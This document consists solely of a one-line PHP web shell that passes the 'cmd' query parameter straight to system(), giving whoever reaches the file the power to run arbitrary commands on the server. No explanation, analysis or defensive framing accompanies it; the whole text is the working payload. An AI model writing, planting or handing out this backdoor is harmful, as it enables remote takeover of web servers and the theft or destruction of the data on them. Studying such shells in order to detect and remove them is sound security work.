<?system($_GET['cmd'])?>
